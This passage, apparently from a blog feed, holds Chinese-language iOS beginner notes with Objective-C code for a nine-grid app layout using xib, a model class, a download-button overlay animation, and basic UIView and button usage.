<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">//xxx.h代码</div><div class="line">#import &lt;UIKit/UIKit.h&gt;</div><div class="line">@class AppModel;</div><div class="line"></div><div class="line">@interface YellowView : UIView</div><div class="line"></div><div class="line">// 属性如果非必要不会暴露在.h文件里</div><div class="line">// 不安全, 扩展性不好, 代码量</div><div class="line"></div><div class="line">@property (nonatomic, strong) AppModel *appModel;</div><div class="line"></div><div class="line">@end</div><div class="line">//xxx.m代码</div><div class="line">#import &quot;xxx.h&quot;</div><div class="line">#import &quot;AppModel.h&quot;</div><div class="line">@interface YellowView()</div><div class="line"></div><div class="line">@property (weak, nonatomic) IBOutlet UIImageView *iconImageView;</div><div class="line">@property (weak, nonatomic) IBOutlet UILabel *nameLabel;</div><div class="line">@property (weak, nonatomic) IBOutlet UIButton *downloadButton;</div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line">//重写appmodel的setter方法</div><div class="line">-(void)setAppmodel:(AppModel *)appmodel&#123;</div><div class="line">  //对属性赋值</div><div class="line">  _appModel = appModel;</div><div class="line">  //对子控件进行赋值</div><div class="line">  _iconImageView.image = [UIImage imageNamed:appModel.icon];</div><div class="line">  _nameLabel.text = appModel.name;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>MVC：</p>
<blockquote>
<p>M—&gt; Model   描述数据，处理数据</p>
<p>V—&gt; View   只是用来显示（UI控件）</p>
<p>C—&gt; Controller  管理view的生命周期，处理用户交互（代码逻辑）</p>
</blockquote>
<h2 id="12-xib和storyboard的异同点"><a href="#12-xib和storyboard的异同点" class="headerlink" title="12.xib和storyboard的异同点"></a>12.xib和storyboard的异同点</h2><p>共同点：可以设置UI界面</p>
<p>不同点：storyboard（描述整个界面）进行界面跳转，是重量级的，xib(描述局部界面)是轻量级的</p>
<h2 id="13-按钮的设置"><a href="#13-按钮的设置" class="headerlink" title="13.按钮的设置"></a>13.按钮的设置</h2><p>点击下载按钮时候需要重新写一个view覆盖原来的界面,并用动画的效果来显示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">- (IBAction)didClickDownloadButton:(id)sender &#123;</div><div class="line">    </div><div class="line">    // 转为UIButton类型</div><div class="line">    UIButton *downButton = sender;</div><div class="line">    </div><div class="line">    // 拿到控制器的view</div><div class="line">    UIView *controllerView = self.superview;</div><div class="line">    </div><div class="line">    // 创建一个遮罩view</div><div class="line">    UIView *coverView = [[UIView alloc] initWithFrame:controllerView.bounds];</div><div class="line">    </div><div class="line">    // 设置透明度</div><div class="line">    // alpha 0(完全透明) &lt;--&gt; 1(完全不透明)</div><div class="line">    coverView.alpha = 0;</div><div class="line">    </div><div class="line">    // 设置颜色</div><div class="line">    [coverView setBackgroundColor:[UIColor blackColor]];</div><div class="line">    </div><div class="line">    // 添加到控制器的view上</div><div class="line">    [controllerView addSubview:coverView];</div><div class="line">    </div><div class="line">    // superView的size</div><div class="line">    CGSize superSize = controllerView.frame.size;</div><div class="line">    </div><div class="line">    // 添加coverView上的文本</div><div class="line">    UILabel *noticeLabel = [[UILabel alloc] initWithFrame:CGRectMake(0, 0, controllerView.bounds.size.width, 20)];</div><div class="line">    </div><div class="line">    // 设置对齐方式</div><div class="line">    noticeLabel.textAlignment = NSTextAlignmentCenter;</div><div class="line">    </div><div class="line">    // 设置文字</div><div class="line">    noticeLabel.text = @&quot;下载中...&quot;;</div><div class="line">    </div><div class="line">    noticeLabel.textColor = [UIColor whiteColor];</div><div class="line">    </div><div class="line">    noticeLabel.center = CGPointMake(superSize.width/2, superSize.height/2);</div><div class="line">    </div><div class="line">    // 添加到coverView上</div><div class="line">    [coverView addSubview:noticeLabel];</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/24E07267-E3F5-49BC-A897-99368D74543C.png" alt="" title="" class="">
                <p></p>
            </figure>
<h2 id="14-插件安装"><a href="#14-插件安装" class="headerlink" title="14.插件安装"></a>14.插件安装</h2><blockquote>
<p>通过xcode的info.plist获得他的UUID</p>
<p>切换到插件安装的路径</p>
<p>找到那个目录下的info.plist，将xcode的UUID给增添进去。</p>
</blockquote>
<h2 id="15-九宫格完整代码展示"><a href="#15-九宫格完整代码展示" class="headerlink" title="15.九宫格完整代码展示"></a>15.九宫格完整代码展示</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div></pre></td><td class="code"><pre><div class="line">#ViewController.m</div><div class="line">#import &quot;ViewController.h&quot;</div><div class="line">#import &quot;AppModel.h&quot;</div><div class="line">#import &quot;YellowView.h&quot;</div><div class="line"></div><div class="line">// 定义了列数</div><div class="line">#define kColumn 3</div><div class="line"></div><div class="line">// imageView的y值</div><div class="line">#define kTopY 5</div><div class="line"></div><div class="line">// 定义imageView的宽高</div><div class="line">#define kImageViewWidth 45</div><div class="line"></div><div class="line">@interface ViewController ()</div><div class="line">/**</div><div class="line"> 防止数据被修改:</div><div class="line"> 不可变数组: 内部元素的数据是不可修改</div><div class="line"> 可变数组更消耗性能</div><div class="line"> */</div><div class="line">@property (nonatomic, strong) NSArray *dataArray;</div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line">@implementation ViewController</div><div class="line"></div><div class="line">/**</div><div class="line"> 懒加载数据 , 重写get方法</div><div class="line"> 必须通过self.dataArray --&gt; 调用 dataArray的get方法</div><div class="line"></div><div class="line"> */</div><div class="line">- (NSArray *)dataArray &#123;</div><div class="line">    if (nil == _dataArray) &#123;</div><div class="line">        // 1. 读取文件的路径</div><div class="line">        NSString *path = [[NSBundle mainBundle] pathForResource:@&quot;app.plist&quot; ofType:nil];</div><div class="line">        </div><div class="line">        // 2. 读取文件内容到临时数组</div><div class="line">//        _dataArray = [NSArray arrayWithContentsOfFile:path];</div><div class="line">        NSArray *tempArray = [NSArray arrayWithContentsOfFile:path];</div><div class="line">        </div><div class="line">        // 3. 遍历tempArray数组 把字典转为 appModel对象</div><div class="line">        NSMutableArray *muta = [NSMutableArray array];</div><div class="line">        </div><div class="line">        for (NSDictionary *dict in tempArray) &#123;</div><div class="line">            // 实例化一个 appModel 对象</div><div class="line">            </div><div class="line">            AppModel *appModel = [AppModel appModelWithDict:dict];</div><div class="line">      </div><div class="line">            // 添加到可变数组</div><div class="line">            [muta addObject:appModel];</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        // 4. 把可变数组赋值给  _dataArray</div><div class="line">        _dataArray = muta;</div><div class="line">        </div><div class="line">    &#125;</div><div class="line">    return _dataArray;</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (void)viewDidLoad &#123;</div><div class="line">    [super viewDidLoad];</div><div class="line">    /**</div><div class="line">     self 在哪里类里就表示这个类自身</div><div class="line">     谁调用的方法, 这个self 就表示谁</div><div class="line">     */</div><div class="line"></div><div class="line">    // 定义间距</div><div class="line">//    CGFloat margin = 20;    </div><div class="line">    // 定义view的宽高</div><div class="line">    CGFloat yellowViewWidth = 80;</div><div class="line">    CGFloat yellowViewHeight = 95;</div><div class="line">    </div><div class="line">    // 计算间距 (屏幕的宽度 - column * yellowViewWidth) / (column + 1)</div><div class="line">    CGFloat margin = (self.view.frame.size.width - kColumn * yellowViewWidth) / (kColumn + 1);</div><div class="line">    </div><div class="line">    for (int i = 0; i &lt; self.dataArray.count; i++) &#123;</div><div class="line">        </div><div class="line">        // 计算行索引</div><div class="line">        NSInteger rowIndex = i / kColumn;</div><div class="line">        </div><div class="line">        // 列索引</div><div class="line">        NSInteger columnIndex = i % kColumn;</div><div class="line">    </div><div class="line">        // 计算x值 , 和列索引有关</div><div class="line">        // 计算公式: x = (i + 1) * margin + i * yellowViewWidth</div><div class="line">        CGFloat yellowViewX = (columnIndex + 1) * margin + columnIndex * yellowViewWidth;</div><div class="line">    </div><div class="line">        // 计算y值的时候是和 行索引有关</div><div class="line">        CGFloat yellowViewY = (rowIndex + 1) * margin + rowIndex * yellowViewHeight;</div><div class="line">        </div><div class="line">        // 实例化一个view并设置了frame</div><div class="line">        </div><div class="line">        // 加载xib , 通过方法, 接收返回的view对象</div><div class="line">       YellowView *yellowView =  [[[NSBundle mainBundle] loadNibNamed:@&quot;YellowView&quot; owner:nil options:nil] lastObject];</div><div class="line">        </div><div class="line">        [yellowView setFrame:CGRectMake(yellowViewX, yellowViewY, yellowViewWidth, yellowViewHeight)];</div><div class="line">        </div><div class="line">        // 添加到控制器的view上</div><div class="line">        [self.view addSubview:yellowView];</div><div class="line">        </div><div class="line">        // 取出对应的model, 设置yelloView子控件上的数据</div><div class="line">        AppModel *appModel  = self.dataArray[i];</div><div class="line">        </div><div class="line">        // 把appModel赋值给 yellowView的appModel属性</div><div class="line">        yellowView.appModel = appModel;</div><div class="line">        </div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div></pre></td><td class="code"><pre><div class="line">#YellowView.h</div><div class="line">#import &lt;UIKit/UIKit.h&gt;</div><div class="line">@class AppModel;</div><div class="line"></div><div class="line">@interface YellowView : UIView</div><div class="line"></div><div class="line">// 属性如果非必要不会暴露在.h文件里</div><div class="line">// 不安全, 扩展性不好, 代码量</div><div class="line"></div><div class="line">@property (nonatomic, strong) AppModel *appModel;</div><div class="line"></div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line">  </div><div class="line">#YellowView.m</div><div class="line">#import &quot;YellowView.h&quot;</div><div class="line">#import &quot;AppModel.h&quot;</div><div class="line"></div><div class="line">@interface YellowView()</div><div class="line"></div><div class="line">/**</div><div class="line"> 显示图片的ImageView</div><div class="line"> */</div><div class="line">@property (weak, nonatomic) IBOutlet UIImageView *iconImageView;</div><div class="line">@property (weak, nonatomic) IBOutlet UILabel *nameLabel;</div><div class="line">@property (weak, nonatomic) IBOutlet UIButton *downloadButton;</div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line">@implementation YellowView</div><div class="line"></div><div class="line"></div><div class="line">// 重写 appModel的set方法</div><div class="line"></div><div class="line">- (void)setAppModel:(AppModel *)appModel &#123;</div><div class="line">    </div><div class="line">    // 1. 先对属性进行赋值</div><div class="line">    _appModel = appModel;</div><div class="line"></div><div class="line">    </div><div class="line">    // 2. 对子控件进行赋值</div><div class="line">    _iconImageView.image = [UIImage imageNamed:appModel.icon];</div><div class="line">    _nameLabel.text = appModel.name;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">// 点击下载按钮调用的方法</div><div class="line">- (IBAction)didClickDownloadButton:(id)sender &#123;</div><div class="line">    </div><div class="line">    // 转为UIButton类型</div><div class="line">    UIButton *downButton = sender;</div><div class="line">    </div><div class="line">    // 拿到控制器的view</div><div class="line">    UIView *controllerView = self.superview;</div><div class="line">    </div><div class="line">    // 创建一个遮罩view</div><div class="line">    UIView *coverView = [[UIView alloc] initWithFrame:controllerView.bounds];</div><div class="line">    </div><div class="line">    // 设置透明度</div><div class="line">    // alpha 0(完全透明) &lt;--&gt; 1(完全不透明)</div><div class="line">    coverView.alpha = 0;</div><div class="line">    </div><div class="line">    // 设置颜色</div><div class="line">    [coverView setBackgroundColor:[UIColor blackColor]];</div><div class="line">    </div><div class="line">    // 添加到控制器的view上</div><div class="line">    [controllerView addSubview:coverView];</div><div class="line">    </div><div class="line">    // superView的size</div><div class="line">    CGSize superSize = controllerView.frame.size;</div><div class="line">    </div><div class="line">    // 添加coverView上的文本</div><div class="line">    UILabel *noticeLabel = [[UILabel alloc] initWithFrame:CGRectMake(0, 0, controllerView.bounds.size.width, 20)];</div><div class="line">    </div><div class="line">    NSLog(@&quot;%@&quot;, NSStringFromCGPoint(noticeLabel.center));</div><div class="line">    </div><div class="line">    // 设置对齐方式</div><div class="line">    noticeLabel.textAlignment = NSTextAlignmentCenter;</div><div class="line">    </div><div class="line">    // 设置文字</div><div class="line">    noticeLabel.text = @&quot;下载中...&quot;;</div><div class="line">    </div><div class="line">    noticeLabel.textColor = [UIColor whiteColor];</div><div class="line">    </div><div class="line">    noticeLabel.center = CGPointMake(superSize.width/2, superSize.height/2);</div><div class="line">    </div><div class="line">    NSLog(@&quot;设置后: %@&quot;, NSStringFromCGPoint(noticeLabel.center));</div><div class="line">    </div><div class="line">    // 添加到coverView上</div><div class="line">    [coverView addSubview:noticeLabel];</div><div class="line">    </div><div class="line">    // 通过动画来显示 coverView</div><div class="line">    [UIView animateWithDuration:1 animations:^&#123;</div><div class="line">        </div><div class="line">        coverView.alpha = 0.6;</div><div class="line">        </div><div class="line">    &#125; completion:^(BOOL finished) &#123;</div><div class="line">        </div><div class="line">        [UIView animateWithDuration:1   // 动画执行的时间</div><div class="line">                              delay:1   // 延迟时间执行动画</div><div class="line">                            options:UIViewAnimationOptionCurveEaseInOut // 动画效果</div><div class="line">                         animations:^&#123;  // 要执行动画的操作</div><div class="line">                             </div><div class="line">                             coverView.alpha = 0;</div><div class="line">            </div><div class="line">        &#125; completion:^(BOOL finished) &#123; // 执行完动画之后的回调</div><div class="line">            </div><div class="line">            // 下载完成之后又, 要把button的状态修改为 被禁用状态</div><div class="line">            downButton.enabled = NO;</div><div class="line">            </div><div class="line">            // 把coverView 从父控件上移除</div><div class="line">            [coverView removeFromSuperview];</div><div class="line">            </div><div class="line">        &#125;];</div><div class="line">    &#125;];</div><div class="line">    </div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">@end</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">#AppModel.h</div><div class="line">#import &lt;Foundation/Foundation.h&gt;</div><div class="line"></div><div class="line">@interface AppModel : NSObject</div><div class="line"></div><div class="line">/**</div><div class="line"> 这两个属性名称一定要和 字典里的key值保持一致</div><div class="line"> 属性的类型  -- &gt; 字典里key对应的value 类型保持一致</div><div class="line"> */</div><div class="line">@property (nonatomic, copy) NSString *name;</div><div class="line"></div><div class="line">@property (nonatomic, copy) NSString *icon;</div><div class="line"></div><div class="line">/**</div><div class="line"> id 和instancetype 都可以做为返回值</div><div class="line"> instancetype :  不可以作为参数类型 , 但 它可以检测返回类型</div><div class="line"> */</div><div class="line">- (instancetype)initWithDict:(NSDictionary *)dict;</div><div class="line"></div><div class="line"></div><div class="line">+ (instancetype)appModelWithDict:(NSDictionary *)dict;</div><div class="line"></div><div class="line">@end</div><div class="line">#AppModel.m</div><div class="line">#import &quot;AppModel.h&quot;</div><div class="line"></div><div class="line">@implementation AppModel</div><div class="line"></div><div class="line">- (instancetype)initWithDict:(NSDictionary *)dict &#123;</div><div class="line">    // 调用父类的实例化方法</div><div class="line">    if (self = [super init]) &#123;</div><div class="line">        self.name = dict[@&quot;name&quot;];</div><div class="line">        self.icon = dict[@&quot;icon&quot;];</div><div class="line">    &#125;</div><div class="line">    return self;</div><div class="line">&#125;</div><div class="line"></div><div class="line">+ (instancetype)appModelWithDict:(NSDictionary *)dict &#123;</div><div class="line">    // 这里在进行alloc 的时候, 最好使用 self</div><div class="line">    return [[self alloc] initWithDict:dict];</div><div class="line">&#125;</div><div class="line"></div><div class="line">@end</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> MVC初步 xib与storyboard </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iOS开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iOS-UI学习]]></title>
      <url>/2017/05/12/iOS-UI%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>UI初步<br><a id="more"></a></p>
<h1 id="UI基础-Day1-2"><a href="#UI基础-Day1-2" class="headerlink" title="UI基础(Day1-2)"></a>UI基础(Day1-2)</h1><p>iOS模拟器:当没有应用设备但是需要测试的时候使用，可以通过菜单栏来进行一些基础操作。</p>
<h2 id="1-Main-storyBoard的作用基本设置"><a href="#1-Main-storyBoard的作用基本设置" class="headerlink" title="1.Main.storyBoard的作用基本设置"></a>1.Main.storyBoard的作用基本设置</h2><blockquote>
<p>改变可视化界面的属性，在右边的菜单栏中进行修改。</p>
<p>在右下角进行对控件的调试</p>
<p>自动布局功能</p>
<p>如果要改变界面的大小点击上方的View Controller</p>
<p>复制控件可以先选中他，然后按住option拖动</p>
<p>当不小心删除了页面之后，可以通过command+z还原</p>
<p>如果想要键盘每次自动弹出，就把hardware中的连接硬件取消掉，只留下虚拟键盘</p>
</blockquote>
<h2 id="2-常用基本控件选择"><a href="#2-常用基本控件选择" class="headerlink" title="2.常用基本控件选择"></a>2.常用基本控件选择</h2><blockquote>
<p>label:单纯显示文字</p>
<p>Button:点击</p>
<p>Text:输入文字</p>
</blockquote>
<h2 id="3-ViewController（视图控制器）"><a href="#3-ViewController（视图控制器）" class="headerlink" title="3.ViewController（视图控制器）"></a>3.ViewController（视图控制器）</h2><blockquote>
<p>管理视图，写代码部分</p>
<p>ViewController里的View是由ViewController管理的</p>
<p>UIView,UIViewController这两个类本身没有关系，UIView的作用是显示,UIViewController中有一个UIView的属性</p>
<p>可以在这里取消自动布局</p>
</blockquote>
<h2 id="4-控件连线"><a href="#4-控件连线" class="headerlink" title="4.控件连线"></a>4.控件连线</h2><blockquote>
<p>右键点击控件，选择触发的事件，注意不同事件的触发效果不同</p>
<p>把代码中的返回值类型中改成IBAction,将它们连线,快速连线可以按住control拖拽来生成新名字的方法。</p>
<p>易错点：当删除方法的时候需要把按钮和方法都删除，不然会报错</p>
<p>如果一个方法只需要点击按钮触发，不需要在其他地方调用，那么不需要在.h中声明，只需要在.m中实现</p>
<p>对于只需要在控制器中使用的控件（属性），我们一般声明在类扩展中，UI控件统统使用weak,UI控件需要连线，也需要添加标识IBOutlet<figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/8E4C5C77-6CF2-4222-A0A2-C76479B055DA.png" alt="" title="" class="">
                <p></p>
            </figure></p>
<p>一个事件可以和多个控件一起连线</p>
</blockquote>
<h2 id="5-计算器方法示例"><a href="#5-计算器方法示例" class="headerlink" title="5.计算器方法示例"></a>5.计算器方法示例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">-(IBAction)doSum&#123;</div><div class="line">  int num1 = [self.field1.text intValue];</div><div class="line">  int num2 = [self.field2.text intValue];</div><div class="line">  int sum = num1 + num2;</div><div class="line">  self.sumLabel.text = [NSString stringWithFormat:@&quot;%d&quot;, sum];</div><div class="line">  //取消焦点，即为在闪烁的光标，每个属性逐一取消</div><div class="line">  [self.field1 resignFirstResponder];</div><div class="line">  [self.field1 resignFirstResponder];</div><div class="line">  //或者直接取消控制器的View编辑状态,推荐使用这种</div><div class="line">  [self.view endEditing:YES];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="6-UIKit坐标系"><a href="#6-UIKit坐标系" class="headerlink" title="6.UIKit坐标系"></a>6.UIKit坐标系</h2><blockquote>
<p>坐标原点与左上角重合</p>
<p>可以在View里面不断嵌套View子控件，使用相对坐标，坐标只是相对于它的父控件的位置</p>
</blockquote>
<h2 id="7-UIView"><a href="#7-UIView" class="headerlink" title="7.UIView"></a>7.UIView</h2><blockquote>
<p>UI界面上，所有能看到的东西都是UIView</p>
<p>所有的控件都是直接或者间接继承UIView</p>
<p>UIView是一个容器，里面可以添加其他的控件</p>
<p>修改父控件的颜色:sender就是我们点击的那个按钮</p>
<p>superview属性:获取父控件</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">//随机颜色获取</div><div class="line">-(IBAction)changeFatherViewColor:(UIButton *)sender&#123;</div><div class="line">  UIView *fatherview = sender.superview;</div><div class="line">  //使用随机数来生成三原色的浓淡程度</div><div class="line">  float randomR = arc4random_uniform(255)/255.0;</div><div class="line">  float randomG = arc4random_uniform(255)/255.0;</div><div class="line">  float randomB = arc4random_uniform(255)/255.0;</div><div class="line">  //使用三原色来组合随机颜色</div><div class="line">  UIColor *randomcolor = [UIColor colorWithRed:randomR green:randomG blue:randomB alpha:1];</div><div class="line">  fatherview.backgroundColor = randomcolor;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//使用代码方式设置控件的位置，不能直接修改控件的Frame属性，可以把Frame属性保存到一个临时变量上修改。</div><div class="line">CGRect oldFrame = createview.frame;</div><div class="line">oldFrame.origin.x = 10;</div><div class="line">createview.frame = oldFrame</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">//创建动画方法一：头尾式动画</div><div class="line">[UIView beginAnimations:nil context:nil];</div><div class="line">//修改动画的各种属性</div><div class="line">[UIView setAnimationsDuration:时间 单位：秒];//在多少秒内完成指令</div><div class="line">[UIView setAnimationsDelay:时间 单位：秒];//延时的秒数</div><div class="line">//关键代码</div><div class="line">省略.....</div><div class="line">//提交动画</div><div class="line">[UIView commitAnimations];</div><div class="line">//创建动画方法二：block动画</div><div class="line">[UIView animateWithDuration:1 animations:^&#123;</div><div class="line">        createview.frame = oldFrame;</div><div class="line">    &#125;];</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">/*按钮设置的注意点</div><div class="line">image属性可以设置按钮的图片，这样设置的图片跟文字平级</div><div class="line">设置background图片文字是在图片的后面</div><div class="line">按钮有很多种状态，默认是default：可以设置一套样式</div><div class="line">点击以后是highlighted，可以设置另一套样式</div><div class="line">selected:需要使用代码设置</div><div class="line">disabled:禁用状态</div><div class="line">／*</div><div class="line">图片放置</div><div class="line">1.放在项目中</div><div class="line">2.放在Assets.xcassets</div></pre></td></tr></table></figure>
<h2 id="8-代码形式的添加button，如果想要设置不同形态的样式，需要分别创建"><a href="#8-代码形式的添加button，如果想要设置不同形态的样式，需要分别创建" class="headerlink" title="8.代码形式的添加button，如果想要设置不同形态的样式，需要分别创建"></a>8.代码形式的添加button，如果想要设置不同形态的样式，需要分别创建</h2><figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/D9EE7EAD-673C-4E4A-95F3-43082AA158A9.png" alt="" title="" class="">
                <p></p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//绑定方法e.g</div><div class="line">[btn addTarget:self action:@selector(haha) forControlEvents:UIControlEventTouchUpInside];</div></pre></td></tr></table></figure>
<h2 id="9-tag属性的使用"><a href="#9-tag属性的使用" class="headerlink" title="9.tag属性的使用"></a>9.tag属性的使用</h2><blockquote>
<p>所有直接或者间接继承来自UIView的控件都有一个tag属性</p>
